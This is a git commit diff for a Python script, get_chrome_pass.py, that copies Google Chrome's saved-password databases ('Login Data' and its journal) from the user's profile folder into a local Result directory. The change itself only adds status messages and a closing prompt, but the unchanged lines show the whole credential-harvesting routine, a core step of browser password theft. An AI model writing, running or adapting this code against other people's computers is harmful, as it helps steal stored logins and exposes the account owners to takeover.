2b5592c4161723a28e3c06cc9c3168734548bf93
martog <martin.holy.grigorov@gmail.com>
2017-01-15 01:28:09 +0200

    Update get_chrome_pass.py

--- Chr_get_pss/get_chrome_pass.py
+++ Chr_get_pss/get_chrome_pass.py
@@ -6,9 +6,10 @@ def get_passwords():
 	directory = os.path.dirname(os.path.realpath(__file__)) + "\Result"
 	if not os.path.exists(directory):
 		os.makedirs(directory)
-   
+		print("\nCreated directory:\n" + directory + "\n")
 
 	#copying Login Data file
+	print("Searching files in:\n" + os.path.expanduser('~') + "\AppData\Local\Google\Chrome\\User Data\Default\n")
 	data_path = os.path.expanduser('~') + "\AppData\Local\Google\Chrome\\User Data\Default\Login Data"
 	final_path = os.path.dirname(os.path.realpath(__file__)) + "\Result\Login Data"
 	shutil.copyfile(data_path, final_path)
@@ -17,10 +18,12 @@ def get_passwords():
 	data_path = os.path.expanduser('~') + "\AppData\Local\Google\Chrome\\User Data\Default\Login Data-journal"
 	final_path = os.path.dirname(os.path.realpath(__file__)) + "\Result\Login Data-journal"
 	shutil.copyfile(data_path, final_path)
-	print("Passwords file copied successfully!")
+	print("Password files copied successfully into:\n" + os.path.dirname(os.path.realpath(__file__)) + "\Result")
+	print("\n---------------------------------------------------")
 
 try:
 	get_passwords()
+	input("Press enter to close program")
 except PermissionError:
 	print("Permission Denied")
 	print(sys.exc_info())
